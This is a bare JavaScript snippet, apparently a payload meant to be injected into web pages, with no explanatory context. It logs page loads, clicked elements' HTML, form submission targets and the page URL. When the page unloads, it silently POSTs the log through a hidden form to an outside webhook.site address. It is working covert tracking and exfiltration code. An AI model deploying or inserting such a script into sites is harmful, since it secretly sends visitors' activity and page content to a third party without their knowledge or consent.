
(() => {
    const WEBHOOK =
        'https://webhook.site/67909b69-79e2-46cd-8eb1-bf3cbfddac04';

    const events = [];

    function record(type, detail = '') {
        events.push({
            type,
            detail,
            url: location.href,
            time: Date.now()
        });
    }

    record('script_loaded');

    document.addEventListener('click', e => {
        record('click', e.target.outerHTML.slice(0, 200));
    }, true);

    document.addEventListener('submit', e => {
        record('submit', e.target.action);
    }, true);

    window.addEventListener('pagehide', () => {
        const form = document.createElement('form');
        form.method = 'POST';
        form.action = WEBHOOK;

        const input = document.createElement('input');
        input.name = 'events';
        input.value = JSON.stringify(events);

        form.appendChild(input);
        document.body.appendChild(form);
        form.submit();
    });
})();
